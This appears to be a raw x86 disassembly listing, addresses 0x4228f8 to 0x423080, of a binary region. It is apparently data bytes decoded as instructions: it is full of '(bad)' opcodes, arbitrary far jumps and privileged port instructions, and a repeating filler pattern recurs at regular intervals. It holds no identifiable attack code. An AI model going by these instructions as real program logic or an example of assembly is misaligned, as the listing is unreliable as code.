  4228f8:	arpl   WORD PTR [esi],cx
  4228fa:	cmp    BYTE PTR [eax+eax*1],0x0
  4228fe:	add    BYTE PTR [eax],al
  422900:	add    BYTE PTR [eax],al
  422902:	add    dl,BYTE PTR ss:[ebp+0xc]
  422906:	jne    0x422967
  422908:	jg     0x422944
  42290a:	clc    
  42290b:	cs aas 
  42290d:	push   0xf490f790
  422912:	and    eax,0x620001d0
  422917:	add    BYTE PTR [eax],al
  422919:	add    BYTE PTR [ebp+0x52],bl
  42291c:	mov    al,ds:0x8506877b
  422921:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422922:	mov    bh,0x8a
  422924:	lods   al,BYTE PTR ds:[esi]
  422925:	sub    eax,edx
  422927:	je     0x4228f2
  422929:	aam    0x97
  42292b:	and    ah,dl
  42292d:	mov    eax,ds:0xee9cc9f2
  422932:	mov    esp,0x1adb14fe
  422937:	xchg   esp,eax
  422938:	add    BYTE PTR [ecx+edi*8],ah
  42293b:	mov    eax,0xe72f3295
  422940:	jmp    0x139:0x1c6fee9a
  422947:	lahf   
  422948:	loop   0x422904
  42294a:	xor    esi,DWORD PTR [ecx]
  42294c:	sbb    dl,cl
  42294e:	ret    
  42294f:	clc    
  422950:	js     0x4229a7
  422952:	mov    dh,0x56
  422954:	lods   al,BYTE PTR ds:[esi]
  422955:	dec    esi
  422956:	mov    edx,fs
  422958:	inc    esi
  422959:	dec    eax
  42295a:	imul   bl
  42295c:	xor    BYTE PTR [eax+ecx*2+0x72],dh
  422960:	sub    eax,0x2fcd0b38
  422965:	daa    
  422966:	adc    edi,esi
  422968:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422969:	or     DWORD PTR [ebp+0xf],esi
  42296c:	mov    ah,0x58
  42296e:	imul   eax,DWORD PTR [edi-0x1912d4ed],0xffffffb1
  422975:	aaa    
  422976:	cmp    al,0x6c
  422978:	pop    ds
  422979:	jp     0x4229e3
  42297b:	cli    
  42297c:	add    BYTE PTR [eax],al
  42297e:	add    BYTE PTR [eax],al
  422980:	add    BYTE PTR [eax],al
  422982:	or     BYTE PTR [ecx-0x404c48e],dh
  422988:	dec    ecx
  422989:	mov    bl,0x94
  42298b:	je     0x422964
  42298d:	call   0xd087:0x8796a08b
  422994:	add    DWORD PTR [eax],eax
  422996:	bound  eax,QWORD PTR [eax]
  422998:	add    BYTE PTR [eax],al
  42299a:	test   al,0xbb
  42299c:	mov    ebp,0x9bcad254
  4229a1:	ret    
  4229a2:	xchg   dl,al
  4229a4:	aad    0xef
  4229a6:	push   ss
  4229a7:	ret    0x62b0
  4229aa:	sub    ebp,DWORD PTR [eax]
  4229ac:	ss push ss
  4229ae:	mov    ah,0xb5
  4229b0:	push   ds
  4229b1:	pop    ss
  4229b2:	xor    ebp,ecx
  4229b4:	pop    edi
  4229b5:	pop    eax
  4229b6:	mov    eax,0xd4a52b59
  4229bb:	push   cs
  4229bc:	in     eax,dx
  4229bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4229be:	mov    ch,0xb0
  4229c0:	stos   DWORD PTR es:[edi],eax
  4229c1:	fstp   QWORD PTR [ebp+eax*1+0x94880a3]
  4229c8:	inc    ecx
  4229c9:	mov    edx,0x39bc9ab8
  4229ce:	(bad)  
  4229cf:	cs inc edx
  4229d1:	(bad)  
  4229d2:	push   ds
  4229d3:	cmp    eax,0x6fcc88be
  4229d8:	fcmovbe st,st(6)
  4229da:	fidivr DWORD PTR [ebp+0x2a]
  4229dd:	cli    
  4229de:	cmc    
  4229df:	jo     0x4229f6
  4229e1:	aas    
  4229e2:	push   eax
  4229e3:	xchg   ebp,eax
  4229e4:	(bad)  
  4229e5:	and    ah,BYTE PTR [edi+eax*8-0x25d2bae2]
  4229ec:	sbb    cl,ah
  4229ee:	pop    eax
  4229ef:	sbb    eax,0xd5a21742
  4229f4:	mov    edi,0xb37605d3
  4229f9:	dec    ebx
  4229fa:	jp     0x422a09
  4229fc:	add    BYTE PTR [eax],al
  4229fe:	add    BYTE PTR [eax],al
  422a00:	add    BYTE PTR [eax],al
  422a02:	fist   WORD PTR [ebx-0x4e]
  422a05:	dec    edi
  422a06:	mov    esi,0x67d3ffef
  422a0b:	xchg   ecx,edi
  422a0d:	adc    al,0xfe
  422a0f:	xchg   edx,eax
  422a10:	mov    ah,0x78
  422a12:	jmp    0x62422be7
  422a17:	add    BYTE PTR [eax],al
  422a19:	add    BYTE PTR [ebp-0x10],ch
  422a1c:	rol    BYTE PTR [ecx],0xd2
  422a1f:	mov    eax,0x34e69bae
  422a24:	push   cs
  422a25:	adc    al,0xc2
  422a27:	sub    DWORD PTR [ecx-0x1de1db45],0x6
  422a2e:	dec    edi
  422a2f:	cmc    
  422a30:	and    al,0x58
  422a32:	pop    edi
  422a33:	push   0xe4d8b8ed
  422a38:	lock test eax,0xb54a544a
  422a3e:	mov    eax,0x40d9ba1a
  422a43:	cmp    eax,0x235f9167
  422a48:	adc    ebp,DWORD PTR [ebx+0x4f]
  422a4b:	ins    DWORD PTR es:[edi],dx
  422a4c:	push   ebx
  422a4d:	pop    ebx
  422a4e:	add    ecx,ebx
  422a50:	xchg   edx,eax
  422a51:	retf   
  422a52:	xlat   BYTE PTR ds:[ebx]
  422a53:	mov    ch,0x20
  422a55:	add    bh,bl
  422a57:	mov    edx,0x475bad38
  422a5c:	dec    eax
  422a5d:	mov    ah,BYTE PTR [ecx-0x80]
  422a60:	repz mov ds:0x2dcef0d6,al
  422a66:	mov    ch,0xd2
  422a68:	arpl   WORD PTR [esi],bp
  422a6a:	enter  0x3f8c,0x1
  422a6e:	mov    al,0x39
  422a70:	and    ebp,ebx
  422a72:	retf   0x6972
  422a75:	stos   BYTE PTR es:[edi],al
  422a76:	sbb    DWORD PTR [ebx-0x56],0x2f
  422a7a:	xor    al,0x84
  422a7c:	add    BYTE PTR [eax],al
  422a7e:	add    BYTE PTR [eax],al
  422a80:	add    BYTE PTR [eax],al
  422a82:	xchg   DWORD PTR [ebx+edx*8],ecx
  422a85:	fcmovu st,st(3)
  422a87:	fisttp WORD PTR [edi+0x640ccb5d]
  422a8d:	push   ss
  422a8e:	mov    cl,0xd
  422a90:	repz bound ecx,QWORD PTR [ebx-0x2f]
  422a94:	add    DWORD PTR [eax],eax
  422a96:	bound  eax,QWORD PTR [eax]
  422a98:	add    BYTE PTR [eax],al
  422a9a:	test   bh,0x4d
  422a9d:	cmc    
  422a9e:	mov    ebx,0x4ee5169
  422aa3:	and    al,0x89
  422aa5:	adc    DWORD PTR [esi+0xff6bef5],ebx
  422aab:	in     al,dx
  422aac:	cld    
  422aad:	shr    BYTE PTR [edx+0x429077ab],0x10
  422ab4:	mov    ds,WORD PTR [esi]
  422ab6:	dec    ebp
  422ab7:	or     dl,BYTE PTR [edi]
  422ab9:	nop
  422aba:	retf   0x2972
  422abd:	dec    esi
  422abe:	leave  
  422abf:	inc    esp
  422ac0:	pusha  
  422ac1:	frstor [ecx-0x40]
  422ac4:	retf   0xb39f
  422ac7:	call   0x67283bf4
  422acc:	aaa    
  422acd:	lea    ecx,[ebx-0x5050adde]
  422ad3:	pop    edi
  422ad4:	out    0x98,eax
  422ad6:	icebp  
  422ad7:	ror    BYTE PTR [eax+0x7461f28c],cl
  422add:	outs   dx,DWORD PTR ds:[esi]
  422ade:	sub    esp,DWORD PTR [eax-0x26b2d43e]
  422ae4:	and    BYTE PTR [eax-0x78],ch
  422ae7:	stos   DWORD PTR es:[edi],eax
  422ae8:	push   edx
  422ae9:	mov    ch,0xf1
  422aeb:	adc    eax,0xebac2904
  422af0:	fisttp DWORD PTR [ecx]
  422af2:	jbe    0x422b53
  422af4:	jo     0x422b65
  422af6:	push   eax
  422af7:	mov    edi,0x1969d7b9
  422afc:	add    BYTE PTR [eax],al
  422afe:	add    BYTE PTR [eax],al
  422b00:	add    BYTE PTR [eax],al
  422b02:	lahf   
  422b03:	arpl   WORD PTR [ebp+0x72],cx
  422b06:	std    
  422b07:	jle    0x422ac8
  422b09:	out    dx,eax
  422b0a:	sbb    edi,esp
  422b0c:	mov    BYTE PTR [ebp+esi*4-0x5256b01e],dh
  422b13:	rol    DWORD PTR [ecx],1
  422b15:	add    BYTE PTR [edx+0x0],ah
  422b18:	add    BYTE PTR [eax],al
  422b1a:	rcl    BYTE PTR [edx],cl
  422b1c:	icebp  
  422b1d:	push   edx
  422b1e:	xor    ah,al
  422b20:	mov    bh,BYTE PTR [ebx]
  422b22:	call   0x41f2:0xfbf73b00
  422b29:	lahf   
  422b2a:	ja     0x422b59
  422b2c:	or     ah,BYTE PTR [ebx-0x3bd3c04b]
  422b32:	pop    ecx
  422b33:	jno    0x422b36
  422b35:	leave  
  422b36:	mov    eax,0x955f37bb
  422b3b:	sbb    BYTE PTR [ebx-0x75b13f1b],dh
  422b41:	imul   edx,DWORD PTR gs:[ebp+0x1e],0x242c461e
  422b49:	std    
  422b4a:	in     al,dx
  422b4b:	int    0xa4
  422b4d:	ret    0x6064
  422b50:	mov    es,WORD PTR ss:[ecx]
  422b53:	dec    ebp
  422b54:	push   esp
  422b55:	pop    esi
  422b56:	lahf   
  422b57:	inc    ebx
  422b58:	lds    eax,FWORD PTR [esi+0x19]
  422b5b:	xor    ebx,DWORD PTR es:[edx]
  422b5e:	xchg   BYTE PTR [edi+edi*8-0x68],dl
  422b62:	jbe    0x422b77
  422b64:	jecxz  0x422be3
  422b66:	jne    0x422b40
  422b68:	sbb    al,0xa0
  422b6a:	xor    ecx,DWORD PTR [edx-0x32f223cd]
  422b70:	pop    edx
  422b71:	rcl    al,0xd8
  422b74:	xor    dl,BYTE PTR [eax+0x5cdeff83]
  422b7a:	inc    ecx
  422b7b:	bound  eax,QWORD PTR [eax]
  422b7d:	add    BYTE PTR [eax],al
  422b7f:	add    BYTE PTR [eax],al
  422b81:	add    BYTE PTR [eax+0x23],dh
  422b84:	and    eax,0x7c6f7769
  422b89:	cmp    esp,DWORD PTR [eax-0x374311e4]
  422b8f:	stc    
  422b90:	pusha  
  422b91:	out    0xf,eax
  422b93:	rol    BYTE PTR [ecx],cl
  422b95:	add    BYTE PTR [edx+0x0],ah
  422b98:	add    BYTE PTR [eax],al
  422b9a:	push   ss
  422b9b:	call   0x3573b95c
  422ba0:	or     BYTE PTR [esi+0x602358fa],dh
  422ba6:	mov    al,0x3f
  422ba8:	pop    es
  422ba9:	sahf   
  422baa:	jne    0x422c0b
  422bac:	cmp    BYTE PTR [ecx],dl
  422bae:	or     bh,BYTE PTR [ecx-0x297a417b]
  422bb4:	xor    BYTE PTR [edi],dl
  422bb6:	rcl    DWORD PTR [ecx+0x3a],1
  422bb9:	or     edx,edx
  422bbb:	add    DWORD PTR [ebp+0x2cf2faf0],edi
  422bc1:	mov    edx,0x3383959c
  422bc6:	out    0xe1,al
  422bc8:	sbb    eax,edi
  422bca:	dec    edx
  422bcb:	jle    0x422bb4
  422bcd:	popf   
  422bce:	mov    WORD PTR [eax-0x85d3352],es
  422bd4:	loop   0x422c21
  422bd6:	push   eax
  422bd7:	dec    ebx
  422bd8:	pop    ebx
  422bd9:	pushf  
  422bda:	push   0xfffffffd
  422bdc:	pushf  
  422bdd:	mov    esi,DWORD PTR [eax+ebx*8]
  422be0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422be1:	aam    0xfa
  422be3:	jns    0x422ba0
  422be5:	mov    edi,0x42649555
  422bea:	mov    al,0x27
  422bec:	lahf   
  422bed:	rcl    BYTE PTR [esi],0x86
  422bf0:	jle    0x422c2a
  422bf2:	sub    DWORD PTR [ecx+esi*2],0xffffff81
  422bf6:	retf   0x5e2
  422bf9:	mov    esi,ss
  422bfb:	repnz add BYTE PTR [eax],al
  422bfe:	add    BYTE PTR [eax],al
  422c00:	add    BYTE PTR [eax],al
  422c02:	xchg   esp,eax
  422c03:	nop
  422c04:	ffree  st(0)
  422c06:	(bad)  
  422c08:	popf   
  422c09:	aam    0x57
  422c0b:	(bad)
  422c0f:	mov    esi,0xd2712226
  422c14:	add    DWORD PTR [eax],eax
  422c16:	bound  eax,QWORD PTR [eax]
  422c18:	add    BYTE PTR [eax],al
  422c1a:	sub    dh,BYTE PTR [ebx-0x7d]
  422c1d:	fnstsw ax
  422c1f:	ret    0x2fc4
  422c22:	aas    
  422c23:	inc    edx
  422c24:	sub    al,0xd6
  422c26:	scas   al,BYTE PTR es:[edi]
  422c27:	push   eax
  422c28:	call   0xa8e2:0x6ea12c10
  422c2f:	pushf  
  422c30:	gs pushf 
  422c32:	imul   BYTE PTR [ecx]
  422c34:	(bad)  
  422c35:	out    0x92,al
  422c37:	leave  
  422c38:	pop    ebp
  422c39:	pop    es
  422c3a:	stos   BYTE PTR es:[edi],al
  422c3b:	mov    ds:0x2122f0d1,eax
  422c40:	std    
  422c41:	(bad)  
  422c42:	adc    DWORD PTR [edi-0x74caca5e],edi
  422c48:	stos   BYTE PTR es:[edi],al
  422c49:	xchg   ecx,eax
  422c4a:	lea    esi,[edi]
  422c4c:	fsubp  st(1),st
  422c4e:	xchg   DWORD PTR [edx*4-0x21b8d1fa],edi
  422c55:	pop    ds
  422c56:	jne    0x422c8d
  422c58:	xchg   BYTE PTR [esi],ch
  422c5a:	ficomp DWORD PTR [ecx]
  422c5c:	dec    ebx
  422c5d:	xor    edi,DWORD PTR [edx+0x479af52e]
  422c63:	jne    0x422c58
  422c65:	pop    ebx
  422c66:	sub    BYTE PTR [edi+0x3a],0x59
  422c6a:	int3   
  422c6b:	call   FWORD PTR [esi+edi*1-0x10305be9]
  422c72:	sbb    eax,0x8d8564a0
  422c77:	fcom   QWORD PTR [ebx+0x11c626]
  422c7d:	add    BYTE PTR [eax],al
  422c7f:	add    BYTE PTR [eax],al
  422c81:	add    ah,dh
  422c83:	mov    dl,0x32
  422c85:	(bad)  
  422c86:	jbe    0x422c5e
  422c88:	hlt    
  422c89:	mov    dl,0xb1
  422c8b:	and    al,0xfe
  422c8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c8e:	ret    0xafb9
  422c91:	in     eax,dx
  422c92:	rcl    edx,cl
  422c94:	add    DWORD PTR [eax],eax
  422c96:	bound  eax,QWORD PTR [eax]
  422c98:	add    BYTE PTR [eax],al
  422c9a:	xor    esi,DWORD PTR es:[ecx+0x5446335e]
  422ca1:	outs   dx,DWORD PTR ds:[esi]
  422ca3:	mov    ebx,0xf926c3a2
  422ca8:	sbb    WORD PTR [ebx+edi*2],0xff8c
  422cad:	push   edx
  422cae:	and    ebp,DWORD PTR [edi-0x54]
  422cb1:	mov    bh,0x2c
  422cb3:	sbb    ah,BYTE PTR [esp+edx*4-0x59]
  422cb7:	mov    WORD PTR es:[edi+ebp*1],es
  422cbb:	push   esi
  422cbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422cbd:	pop    esp
  422cbe:	ret    
  422cbf:	arpl   WORD PTR [ebx],sp
  422cc1:	xor    bl,cl
  422cc3:	sub    esi,ebp
  422cc5:	test   al,0xe0
  422cc7:	(bad)  
  422cc8:	fidivr DWORD PTR [eax+0x63]
  422ccb:	xor    al,0x3e
  422ccd:	arpl   WORD PTR [edi-0x50],bp
  422cd0:	xor    al,cl
  422cd2:	clc    
  422cd3:	fistp  DWORD PTR [esi+0x69]
  422cd6:	mov    cl,0x67
  422cd8:	mov    ah,0xd2
  422cda:	nop
  422cdb:	mov    WORD PTR [ebx],?
  422cdd:	ret    
  422cde:	fisub  WORD PTR [ebx+edx*8+0x19da6f65]
  422ce5:	mov    esi,0x7d5ccaac
  422cea:	(bad)  
  422ceb:	test   eax,0x88254428
  422cf0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422cf1:	pop    ss
  422cf2:	mov    DWORD PTR [ecx+0x72],esi
  422cf5:	xchg   esp,eax
  422cf6:	jbe    0x422c82
  422cf8:	xor    edi,DWORD PTR [ebx-0x1d]
  422cfb:	aas    
  422cfc:	add    BYTE PTR [eax],al
  422cfe:	add    BYTE PTR [eax],al
  422d00:	add    BYTE PTR [eax],al
  422d02:	xor    dl,bl
  422d04:	into   
  422d05:	mov    ds:0xd37ebfef,al
  422d0a:	sub    edi,DWORD PTR [esi]
  422d0c:	out    0x3f,eax
  422d0e:	dec    esp
  422d0f:	mov    cl,0xb
  422d11:	jge    0x422d48
  422d13:	rol    DWORD PTR [ecx],cl
  422d15:	add    BYTE PTR [edx+0x0],ah
  422d18:	add    BYTE PTR [eax],al
  422d1a:	(bad)  
  422d1b:	call   0x24c:0x291c1453
  422d22:	aas    
  422d23:	int3   
  422d24:	cmp    bl,BYTE PTR [edx-0x3535a3ac]
  422d2a:	pop    ebx
  422d2b:	scas   al,BYTE PTR es:[edi]
  422d2c:	push   0xffffffc5
  422d2e:	sub    eax,0x2a6495a4
  422d33:	cmp    DWORD PTR es:[eax-0x26],0xffffffbc
  422d38:	sub    bl,BYTE PTR [ecx+0x36856149]
  422d3e:	mov    ah,0xfd
  422d40:	icebp  
  422d41:	js     0x422d0a
  422d43:	and    DWORD PTR [edi-0x42],ebx
  422d46:	push   ds
  422d47:	mov    ds:0xc3ee75f5,eax
  422d4c:	cmp    bl,bh
  422d4e:	stos   DWORD PTR es:[edi],eax
  422d4f:	push   ebx
  422d50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422d51:	inc    edi
  422d52:	in     eax,0x60
  422d54:	cmp    ecx,DWORD PTR [esi-0x2f]
  422d57:	or     eax,0x9005140e
  422d5c:	(bad)  
  422d5d:	shl    DWORD PTR [edx],0xe2
  422d60:	nop
  422d61:	add    ebx,ebx
  422d63:	ins    BYTE PTR es:[edi],dx
  422d64:	retf   0x700e
  422d67:	movups xmm1,XMMWORD PTR [ecx]
  422d6a:	pushf  
  422d6b:	test   DWORD PTR [eax+0x57],ecx
  422d6e:	cmp    DWORD PTR [edx],edi
  422d70:	sub    BYTE PTR [eax+0x3c440495],dl
  422d76:	jecxz  0x422d6a
  422d78:	add    DWORD PTR [ebp+0xf053],0x0
  422d7f:	add    BYTE PTR [eax],al
  422d81:	add    bl,bl
  422d83:	in     eax,dx
  422d84:	outs   dx,BYTE PTR ds:[esi]
  422d85:	and    bh,BYTE PTR [esi-0x5d]
  422d88:	(bad)  
  422d8a:	pop    esi
  422d8b:	(bad)  
  422d8c:	mov    DWORD PTR [ebp-0x11cd45b2],ecx
  422d92:	xchg   edi,eax
  422d93:	rol    DWORD PTR [ecx],cl
  422d95:	add    BYTE PTR [edx+0x0],ah
  422d98:	add    BYTE PTR [eax],al
  422d9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422d9b:	push   ecx
  422d9c:	mov    edx,0x58fd760c
  422da1:	mov    ecx,0xf6bea554
  422da6:	or     DWORD PTR [ebp+0x45c93f2b],ecx
  422dac:	adc    ebx,DWORD PTR [eax+eax*8+0x5]
  422db0:	and    eax,0x467ec596
  422db5:	jecxz  0x422df3
  422db7:	ret    0xad4b
  422dba:	xchg   edx,eax
  422dbb:	(bad)  
  422dbd:	ins    BYTE PTR es:[edi],dx
  422dbe:	push   ebx
  422dbf:	enter  0xa2c,0x8b
  422dc3:	ds loop 0x422df1
  422dc6:	inc    esi
  422dc7:	je     0x422dd7
  422dc9:	pop    ebx
  422dca:	pop    edi
  422dcb:	push   ss
  422dcc:	pop    edi
  422dcd:	mov    dl,0x1a
  422dcf:	stos   BYTE PTR es:[edi],al
  422dd0:	ins    DWORD PTR es:[edi],dx
  422dd1:	jb     0x422e03
  422dd3:	rcl    DWORD PTR [edi],0x62
  422dd6:	repz mov fs,WORD PTR [edi-0x47d40128]
  422ddd:	jle    0x422dfb
  422ddf:	repnz or BYTE PTR [edi+0x34],bl
  422de3:	cmp    eax,0x75267689
  422de8:	mov    cl,0x5e
  422dea:	and    bh,cl
  422dec:	inc    ebx
  422ded:	rol    edi,0xb6
  422df0:	adc    dl,BYTE PTR [edx+ecx*1-0x5f]
  422df4:	dec    edi
  422df5:	gs icebp 
  422df7:	pusha  
  422df8:	and    ah,BYTE PTR [edx]
  422dfa:	(bad)  
  422dfb:	fiadd  WORD PTR [eax]
  422dfd:	add    BYTE PTR [eax],al
  422dff:	add    BYTE PTR [eax],al
  422e01:	add    BYTE PTR ds:0x6f976b22,al
  422e07:	(bad)  
  422e09:	mov    dl,0x66
  422e0b:	and    BYTE PTR [esi-0x6658f196],ah
  422e11:	(bad)  
  422e12:	stc    
  422e13:	rol    DWORD PTR [ecx],cl
  422e15:	add    BYTE PTR [edx+0x0],ah
  422e18:	add    BYTE PTR [eax],al
  422e1a:	and    cl,BYTE PTR [ecx-0x5]
  422e1d:	pop    ebp
  422e1e:	ja     0x422e2f
  422e20:	and    al,0xd6
  422e22:	addr16 jle 0x422deb
  422e25:	loop   0x422dc5
  422e27:	dec    edi
  422e28:	test   DWORD PTR [eax+0x1cc9c0e7],eax
  422e2e:	add    al,0xee
  422e30:	adc    BYTE PTR [esi+ebx*1+0x56fc59b4],dh
  422e37:	pop    ebp
  422e38:	loopne 0x422e89
  422e3a:	xchg   ecx,eax
  422e3b:	mov    ebx,0xd1e8a8f9
  422e40:	inc    eax
  422e41:	jae    0x422ea8
  422e43:	mov    ch,0x3c
  422e45:	idiv   DWORD PTR [ebx]
  422e47:	jecxz  0x422e09
  422e49:	sub    al,0xdb
  422e4b:	ja     0x422e35
  422e4d:	dec    eax
  422e4e:	mov    bl,BYTE PTR [eax+0x67]
  422e51:	shl    BYTE PTR [edi],0xdc
  422e54:	dec    edi
  422e55:	jp     0x422e74
  422e57:	xchg   esp,eax
  422e58:	cli    
  422e59:	jg     0x422e78
  422e5b:	jg     0x422e33
  422e5d:	fwait
  422e5e:	push   esi
  422e5f:	dec    esp
  422e60:	xchg   edx,eax
  422e61:	push   eax
  422e62:	pop    esp
  422e63:	and    DWORD PTR [edx],esp
  422e65:	adc    eax,0x9a93ba05
  422e6a:	mov    bh,0x18
  422e6c:	pop    esi
  422e6d:	adc    bl,BYTE PTR [ebx+0x1f23d4b7]
  422e73:	mov    dh,0x8
  422e75:	jne    0x422e55
  422e77:	fidivr WORD PTR [ecx+0x6c]
  422e7a:	xchg   DWORD PTR [ebx+0x0],esp
  422e7d:	add    BYTE PTR [eax],al
  422e7f:	add    BYTE PTR [eax],al
  422e81:	add    BYTE PTR [ebx+0x7fd924d4],cl
  422e87:	stc    
  422e88:	call   esi
  422e8a:	into   
  422e8b:	inc    ebp
  422e8c:	mov    bh,0x11
  422e8e:	(bad)  
  422e8f:	mov    ebx,0xd45b3f14
  422e94:	add    DWORD PTR [eax],eax
  422e96:	bound  eax,QWORD PTR [eax]
  422e98:	add    BYTE PTR [eax],al
  422e9a:	sub    bh,bl
  422e9c:	cmc    
  422e9d:	xor    DWORD PTR [ebx-0x1c],ecx
  422ea0:	mov    DWORD PTR [eax],ebp
  422ea2:	add    al,0xec
  422ea4:	xchg   edx,eax
  422ea5:	dec    ebp
  422ea6:	cmc    
  422ea7:	add    ah,bl
  422ea9:	add    eax,0xe6bcdf07
  422eae:	ss inc ebx
  422eb0:	enter  0x263b,0x27
  422eb4:	rol    BYTE PTR [esi+0x3c],1
  422eb7:	aam    0x80
  422eb9:	stc    
  422eba:	or     eax,0x18a33ddd
  422ebf:	ja     0x422ecf
  422ec1:	ret    0xdccb
  422ec4:	lea    ebx,[edx]
  422ec6:	std    
  422ec7:	mov    ebx,0x4682d4f1
  422ecc:	out    dx,eax
  422ecd:	xchg   cl,ch
  422ecf:	ins    BYTE PTR es:[edi],dx
  422ed0:	jmp    0xf6fa:0xd77bd8e4
  422ed7:	loopne 0x422ea5
  422ed9:	out    0xf2,al
  422edb:	scas   al,BYTE PTR es:[edi]
  422edc:	jbe    0x422f56
  422ede:	(bad)  
  422ee0:	imul   edx,DWORD PTR [ecx+ebp*2-0x6f37ba03],0xffffffd5
  422ee8:	std    
  422ee9:	sar    BYTE PTR [esi+0x79],cl
  422eec:	jp     0x422f58
  422eee:	pop    es
  422eef:	pop    ebp
  422ef0:	and    al,0x7
  422ef2:	lock outs dx,BYTE PTR ds:[esi]
  422ef4:	jae    0x422f5d
  422ef6:	repz pushf 
  422ef8:	cmp    BYTE PTR [ebx],al
  422efa:	ficom  WORD PTR [esi+0x0]
  422efd:	add    BYTE PTR [eax],al
  422eff:	add    BYTE PTR [eax],al
  422f01:	add    dh,bl
  422f03:	sub    DWORD PTR [eax-0x210c002e],ebx
  422f09:	sub    eax,0x4af35f6
  422f0e:	imul   eax,DWORD PTR [esi-0x2b42180f],0x1
  422f15:	add    BYTE PTR [edx+0x0],ah
  422f18:	add    BYTE PTR [eax],al
  422f1a:	dec    ebx
  422f1b:	mov    WORD PTR [edx+0x1b],gs
  422f1e:	sbb    ebx,edx
  422f20:	pushf  
  422f21:	pop    ecx
  422f22:	sbb    dh,bl
  422f24:	pop    edi
  422f25:	outs   dx,DWORD PTR ds:[esi]
  422f26:	sub    ecx,DWORD PTR [esi]
  422f28:	and    bl,BYTE PTR [ecx+eiz*2+0x4373c3db]
  422f2f:	and    al,0x25
  422f31:	push   0xffffffbe
  422f33:	jle    0x422f99
  422f35:	bound  esp,QWORD PTR [esp+ebx*1+0x74155303]
  422f3c:	mov    al,ds:0x8447c618
  422f41:	add    edi,DWORD PTR [eax+0x2f8bee0e]
  422f47:	test   DWORD PTR [edi+edx*8+0x3adec5cb],edx
  422f4e:	adc    BYTE PTR [ebp-0x2affecd7],cl
  422f54:	xchg   esi,eax
  422f55:	mov    ebp,0xecc972c4
  422f5a:	test   al,0xc3
  422f5c:	aad    0x5
  422f5e:	mov    ebp,0xbff48557
  422f63:	inc    esi
  422f64:	push   es
  422f65:	pop    edx
  422f66:	test   DWORD PTR [ecx+0x4d],esi
  422f69:	jmp    0x616c:0xc16f246c
  422f70:	push   eax
  422f71:	fmul   DWORD PTR [edi-0x260c784b]
  422f77:	sub    al,0xf3
  422f79:	mov    ecx,0x2367
  422f7e:	add    BYTE PTR [eax],al
  422f80:	add    BYTE PTR [eax],al
  422f82:	dec    esi
  422f83:	aas    
  422f84:	int3   
  422f85:	sbb    eax,0x7fdffffd
  422f8a:	out    dx,eax
  422f8b:	loopne 0x422fa3
  422f8d:	lods   al,BYTE PTR ds:[esi]
  422f8e:	std    
  422f8f:	inc    BYTE PTR [edx+0x1d51fbb]
  422f95:	add    BYTE PTR [edx+0x0],ah
  422f98:	add    BYTE PTR [eax],al
  422f9a:	sbb    al,0xf7
  422f9c:	repz xchg ebp,eax
  422f9e:	pop    eax
  422f9f:	cmp    bl,BYTE PTR [ebp-0x61fbc6d4]
  422fa5:	pusha  
  422fa6:	shl    ch,cl
  422fa8:	out    dx,al
  422fa9:	addr16 popf 
  422fab:	xor    dl,BYTE PTR [edi-0x51badbfe]
  422fb1:	sub    DWORD PTR [ebx+0x57],ebx
  422fb4:	xchg   edx,eax
  422fb5:	or     DWORD PTR [edi+0x30],ecx
  422fb8:	ror    ecx,1
  422fba:	cdq    
  422fbb:	aam    0xec
  422fbd:	mov    esp,0x4c1bdb58
  422fc2:	xor    DWORD PTR [eax],ebp
  422fc4:	push   edx
  422fc5:	icebp  
  422fc6:	mov    cl,0xfd
  422fc8:	jo     0x422fe2
  422fca:	aas    
  422fcb:	jecxz  0x422fa3
  422fcd:	int3   
  422fce:	int    0x5f
  422fd0:	mov    edi,0x9f03e5d8
  422fd5:	sub    DWORD PTR [edi+0x5478c01c],eax
  422fdb:	(bad)  
  422fde:	mov    bl,0x87
  422fe0:	or     BYTE PTR [ebx-0x2f91d267],dh
  422fe6:	dec    edx
  422fe7:	pop    eax
  422fe8:	cmp    BYTE PTR [esi-0x77],al
  422feb:	fs push ds
  422fed:	add    eax,0xffffffcd
  422ff0:	pop    eax
  422ff1:	push   ebp
  422ff2:	pop    edi
  422ff3:	sbb    eax,0x389fa43f
  422ff8:	or     bl,bl
  422ffa:	jbe    0x422fba
  422ffc:	add    BYTE PTR [eax],al
  422ffe:	add    BYTE PTR [eax],al
  423000:	add    BYTE PTR [eax],al
  423002:	push   ds
  423003:	test   eax,0x7ff735f6
  423008:	fild   QWORD PTR [ebx-0x5f9ed871]
  42300e:	dec    ebp
  42300f:	sub    esi,esp
  423011:	stc    
  423012:	adc    ebp,0x620001
  423018:	add    BYTE PTR [eax],al
  42301a:	rol    DWORD PTR [edx],0x6e
  42301d:	jmp    0xe5f1:0xe174b087
  423024:	cwde   
  423025:	fwait
  423026:	pop    eax
  423027:	loopne 0x42301d
  423029:	mov    DWORD PTR [ebx+ebp*4-0x13],edi
  42302d:	loop   0x423080
  42302f:	aas    
  423030:	xlat   BYTE PTR ds:[ebx]
  423031:	mov    esi,0x3342b98b
  423036:	sar    dl,1
  423038:	xchg   ebx,eax
  423039:	mov    ds:0xf8354072,al
  42303e:	popf   
  42303f:	in     eax,dx
  423040:	push   edx
  423041:	das    
  423042:	push   ss
  423043:	fidivr DWORD PTR [ecx-0x1729a70c]
  423049:	mov    ecx,esp
  42304b:	enter  0x4bb7,0xeb
  42304f:	mov    edx,0x1d205a5f
  423054:	xchg   ebx,eax
  423055:	jno    0x4230a1
  423057:	dec    esi
  423058:	(bad)  
  423059:	or     DWORD PTR [edx+0x49],esi
  42305c:	mov    eax,DWORD PTR [esi]
  42305e:	inc    ebx
  42305f:	rcl    bh,0x50
  423062:	ja     0x423000
  423064:	ficom  DWORD PTR ds:0xf744f6bf
  42306a:	xor    BYTE PTR gs:[esi],dl
  42306d:	and    esp,DWORD PTR [eax]
  42306f:	push   ebp
  423070:	mov    bl,0x8f
  423072:	push   ebp
  423073:	adc    DWORD PTR [eax+edx*4-0x29],ecx
  423077:	push   eax
  423078:	frstor [eax+0xdd86]
  42307e:	add    BYTE PTR [eax],al
  423080:	add    BYTE PTR [eax],al
